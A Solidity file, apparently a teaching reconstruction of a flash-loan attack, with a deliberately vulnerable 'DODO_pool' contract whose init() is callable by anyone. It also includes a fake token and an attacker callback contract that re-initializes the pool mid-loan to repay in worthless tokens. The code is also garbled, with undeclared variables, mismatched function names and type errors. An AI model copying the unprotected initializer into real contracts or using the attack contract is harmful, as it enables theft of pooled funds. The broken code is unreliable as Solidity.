import "ERC20.sol";

contract DODO_pool is ERC20 {
    address token0;
    address token1;
    address owner;
    uint token0Amount;
    uint token1Amount;
    uint K;
    function init(address _token0, address _token1) public {
        token0 = _token0;
        token1 = _token1;
        owner = msg.sender;
    }    
    function init_pool_funds() public {
        require(msg.sender == owner);
        token0Amount = iERC20(token0).balanceOf(address(this));
        token1Amount = iERC20(token1).balanceOf(address(this));
        K = token0Amount * token1Amount; 
        balances[owner] = 100000;
        total = balances[owner];
    }
    function flashLoan(uint amount0, uint amount1, address wallet) public {
        uint total_token_0_before = iERC20(token0); 
        uint total_token_1_before = iERC20(token1);
        iERC20(token0).transfer(wallet, amount0);
        iERC20(token1).transfer(wallet, amount1);
        IDODOCallee(wallet).returnFlashLoad();
        // require profit
        uint total_token_0_after = iERC20(token0); 
        uint total_token_1_after = iERC20(token1); 
        require(total_token_0_after + total_token_1_after * total_token_0_before / total_token_1_before >= total_token_0_before * 2, "flash loan failed - funds aren't returned");
    }

    function remove_liquidity(uint LP_tokens) public {
        // sync();      // add sync() here to solve the bug
        burn(msg.sender, LP_tokens);
        uint LP_total_supply = total;
        K = K * LP_total_supply / (LP_total_supply + LP_tokens);
    }
    function getContractAddress() public view returns (address) {
        return address(this);
    }
    function getToken0DepositAddress() public view returns (address) {
        return token0;
    }
    function getToken1DepositAddress() public view returns (address) {
        return token1;
    }
    function sync() public {
        token0Amount = iERC20(token0).balanceOf(address(this));
        token1Amount = iERC20(token1).balanceOf(address(this));
    }
    function mint(address user, uint amount0, uint amount1) internal returns (uint){
        uint totalBalance0 = iERC20(token0).balanceOf(address(this));
        uint totalBalance1 = iERC20(token1).balanceOf(address(this));
        uint mint_0 = total * amount0 / (totalBalance0-amount0);
        uint mint_1 = total * amount1 / (totalBalance0-amount1);
        uint to_mint = mint_0 < mint_1 ? mint_0 : mint_1;
        balances[user] += to_mint;
        total += to_mint;
        return to_mint;
    }
    function burn(address user, uint LP_tokens) internal  {
        require(balances[user] >= LP_tokens);
        uint pay_in_0 = LP_tokens * iERC20(token0).balanceOf(address(this)) / total;
        uint pay_in_1 = LP_tokens * iERC20(token1).balanceOf(address(this)) / total;
        balances[user] -= LP_tokens;
        total -= LP_tokens;
        token0Amount -= pay_in_0;
        token1Amount -= pay_in_1;
        iERC20(token0).transfer(user, pay_in_0);
        iERC20(token1).transfer(user, pay_in_1);
    }    
}

contract FakeToken is ERC20 {
    function deposit() public payable {
        // MINT IS HERE
        uint minted_tokens = msg.value / 1e10;
        balances[msg.sender] += minted_tokens;
        total += minted_tokens;
    }
    
    function withdraw() public {
        // BURN IS HERE
        uint tmp_balance = balances[msg.sender];
        balances[msg.sender] = 0;
        total -= tmp_balance;
        msg.sender.call{value: tmp_balance * 1e10}("");
    }
    
    function getAddress() public view returns(address) {
        return address(this);
    }
}


/* 
    The wallet that the flash load funds are trasfered to must implement the IDODOCallee interface.
    This is a wallet implementation that can exploit the vulnerability.
*/

interface IDODOCallee {
    function returnFlashLoan() external;
    function getFlashLoan() external;
}

contract AttackerDODOCalleeImp is IDODOCallee{
    uint token0_to_return = 0;
    uint token1_to_return = 0;
    address token0;
    address token1;
    address lender;
    uint record_token0_balance = 0;
    uint record_token1_balance = 0;

    constructor(address _token0, address _token1, address _lender, address _fake_token0, address _fake_token1) {
        token0 = _token0;
        token1 = _token1;
        lender = _lender;
        fake_token0 = _fake_token0;
        fake_token1 = _fake_token1;
    }
    
    function returnFlashLoan() external {
        DODO_pool(_lender).init(fake_token0, fake_token1);
        fake_token0.transfer(_lender, IERC20(token0).balanceOf(address(this)) + token0_to_return);
        fake_token1.transfer(_lender, IERC20(token1).balanceOf(address(this)) + token1_to_return);
    }

    function getFlashLoan(uint ask_amount0, uint ask_amount1) external {
        DODO_pool(_lender).flashLoan(ask_amount0, ask_amount1, msg.sender);
        token0_to_return += IERC20(token0).balanceOf(address(this)) - record_token0_balance;
        token1_to_return += IERC20(token1).balanceOf(address(this)) - record_token1_balance;
    }
}
contract LegalDODOCalleeImp is IDODOCallee{
    uint token0_to_return = 0;
    uint token1_to_return = 0;
    address token0;
    address token1;
    address lender;
    uint record_token0_balance = 0;
    uint record_token1_balance = 0;
    
    constructor(address _token0, address _token1, address _lender) {
        token0 = _token0;
        token1 = _token1;
        record_token0_balance = IERC20(token0).balanceOf(address(this));
        record_token1_balance = IERC20(token1).balanceOf(address(this));
        lender = _lender;
    }
    function returnFlashLoan() external {
        token0_to_return = 0;
        token1_to_return = 0;
    }
    function getFlashLoan(uint ask_amount0, uint ask_amount1) external {
        DODO_pool(_lender).flashLoan(ask_amount0, ask_amount1, msg.sender);
        token0_to_return += IERC20(token0).balanceOf(address(this)) - record_token0_balance;
        token1_to_return += IERC20(token1).balanceOf(address(this)) - record_token1_balance;
    }
}